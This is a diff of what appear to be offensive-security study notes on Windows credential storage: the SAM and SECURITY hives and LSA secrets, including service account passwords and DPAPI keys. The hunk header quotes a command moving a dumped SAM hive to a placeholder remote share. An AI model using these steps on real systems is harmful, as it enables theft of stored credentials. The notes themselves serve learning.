@@ -36,4 +36,6 @@ move sam.save \\<hoost ip>\SHARENAME
 		-> Machine-wide system config 
 		-> current control set- A **control set** in Windows is a registry key under `HKEY_LOCAL_MACHINE\SYSTEM` that stores the configuration data Windows uses to boot and run the system device drivers, services, paging file settings, etc
 		-> Local Security Authority(LSA) secrets, stored under `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets` , accessible only to SYSTEM-privileged processes. 
+			-> **LSA secrets** are just passwords that Windows saves so it can log in on your behalf without you typing them.
+			-> Service acc passes, DPAPI local keys (`dpapi_userkey`, `dpapi_machinekey`), and EFS/encryption keys.
 	- `C:\Windows\System32\config\SECURITY `
